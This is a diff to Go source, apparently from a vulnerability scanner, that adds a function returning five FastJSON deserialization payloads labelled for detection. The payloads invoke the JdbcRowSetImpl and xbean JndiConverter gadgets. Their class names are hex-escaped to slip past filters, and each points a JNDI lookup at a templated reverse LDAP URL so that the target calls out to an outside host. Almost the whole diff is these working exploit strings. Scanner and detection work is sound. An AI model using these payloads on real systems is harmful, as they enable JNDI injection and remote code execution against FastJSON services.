@@ -85,6 +85,58 @@ func GetUrlPayload() (payloads []string) {
 	return
 }
 
+// GetLdapPayload returns LDAP-based JNDI injection payloads for FastJSON detection
+func GetLdapPayload() (payloads []string) {
+	payloads = append(payloads, `{
+  "aii87d": {
+    "@type": "java.lang.Class",
+    "val": "\x63om\x2E\x73un.\x72ow\x73et.JdbcRowSetI\x6Dpl"
+  },
+  "1qnb89": {
+    "@type": "\x63om\x2E\x73un.\x72ow\x73et.JdbcRowSetI\x6Dpl",
+    "dataSourceName": "{{reverse-ldap-url}}",
+    "autoCommit": true
+  }
+}`)
+
+	payloads = append(payloads, `{
+  "r31nby": {
+    "@t\x79pe": "L\x63om\x2Esun.rows\x65t.\x4AdbcR\x6FwSetImpl;",
+    "dataSourceName": "{{reverse-ldap-url}}",
+    "autoCommit": true
+  }
+}`)
+
+	payloads = append(payloads, `{
+  "gd9br5": {
+    "@typ\x65": "o\x72g.a\x70a\x63\x68e.xbea\x6E.p\x72ope\x72t\x79ed\x69\x74\x6Fr\x2EJnd\x69C\x6Fn\x76\x65rter",
+    "AsText": "{{reverse-ldap-url}}"
+  }
+}`)
+
+	payloads = append(payloads, `[{
+  "0ec7yo": {
+    "@type": "org.ap\x61che.xbean.propertyeditor\x2EJn\x64iCon\x76e\x72ter",
+    "AsText": "{{reverse-ldap-url}}"
+  }
+}
+]`)
+
+	payloads = append(payloads, `[{
+  "64p9gu": {
+    "@type": "java.lang.Class",
+    "val": "co\x6D.su\x6E.\x72o\x77s\x65t.JdbcRowSetI\x6Dp\x6C"
+  },
+  "lywr78": {
+    "@type": "co\x6D.su\x6E.\x72o\x77s\x65t.JdbcRowSetI\x6Dp\x6C",
+    "dataSourceName": "{{reverse-ldap-url}}",
+    "autoCommit": true
+  }
+}]`)
+
+	return
+}
+
 func GetDomainPayload() (payloads []string) {
 	payloads = append(payloads, `{
   "xp7px6":{{
